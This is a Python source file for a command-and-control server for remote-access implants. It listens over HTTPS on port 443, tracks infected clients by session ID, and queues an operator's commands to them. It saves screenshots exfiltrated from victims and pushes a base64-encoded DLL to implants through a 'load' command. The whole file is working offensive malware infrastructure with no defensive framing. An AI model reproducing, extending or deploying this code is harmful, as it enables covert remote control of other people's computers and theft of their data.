import json
import ssl
import threading
import queue
import logging
import zlib
import base64
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

# Globals to keep track of sessions and session data
sessions          = {}
session_queues    = {}
session_commands  = {}
previous_commands = {}
selected_session = None

def bmp(data):
    d = json.loads(data)
    with open("D:\\bitmap.bmp", "wb") as f:
        f.write(zlib.decompress(base64.b64decode(d["buffers"][0]['data'])))

class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Override to log to a file instead of stdout
        logging.info("%s - - [%s] %s\n" %
                     (self.client_address[0],
                      self.log_date_time_string(),
                      format % args))
    def do_POST(self):
        global sessions
        global session_queues
        global session_commands
        global previous_commands
        
        clientid = self.headers.get("clientid")
        commands = self.headers.get("Commands")
        command = self.headers.get("command")
        
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)
        received = post_data
        response = b""
        # Got back a response from a command
        if (received != b"none"):
            #cmd = previous_commands[clientid].get()
            cmd = command
            print("[ {} ]".format(cmd[:256]))
            if cmd.startswith("screenshot"):
                bmp(received)
            print(str(received)[:100])
            #for line in str(received)[2:-1].split("\\n"):
            #    print(line)

        if clientid:
            if clientid not in sessions:
                print("\n[+] Adding clientid: {}".format(clientid))
                sessions[clientid] = 0
                session_queues[clientid] = queue.Queue()
                session_commands[clientid] = commands.split() if commands else []
                previous_commands[clientid] = queue.Queue()
           
            sessions[clientid] += 1
            session_commands[clientid] = commands.split() if commands else []
            if not session_queues[clientid].empty():
                response = session_queues[clientid].get()
                print("sending command:", response[:256])
                if not isinstance(response, bytes):
                    response = response.encode()
        else:
            print("client missing")

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)


def run_server(server_class=HTTPServer, handler_class=CustomHTTPRequestHandler, port=443):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    
    # Load SSL context
    httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="key.pem", certfile='cert.pem', server_side=True)
    
    print(f'Serving HTTPS on port {port}...')
    httpd.serve_forever()

def user_interface():
    global selected_session
    
    while True:
        if selected_session:
            print(f'Selected session: {selected_session}')
            print("Available commands: bg (background)", session_commands[selected_session])
            print("Queued commands:")
            with session_queues[selected_session].mutex:
                for i,item in enumerate(list(session_queues[selected_session].queue)):
                    print(i, item)

            command = input("[{}]> ".format(selected_session))
            
            if command in ['bg', 'background']:
                selected_session = None
            elif len(command.strip()) < 2:
                pass
            else:
                if "LOADTEST" in command:
                    with open("screenshot.dll", "rb") as f:
                        data = f.read()
                    command = "load " + base64.b64encode(data).decode()
                session_queues[selected_session].put(command)
                previous_commands[selected_session].put(command)
                print(f'Queued data for session {selected_session}.')
        else:
            print("Current sessions:", sessions.keys())
            print("Commands available:")
            print("  select <clientid>")
            print("  exit")
            command = input("[]> ")
            
            if command.startswith('select '):
                clientid = command.split(' ')[1]
                if clientid in sessions:
                    selected_session = clientid
                else:
                    print(f'[!] Session {clientid} does not exist.')
            elif command == 'exit':
                break

if __name__ == "__main__":
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    
    user_interface()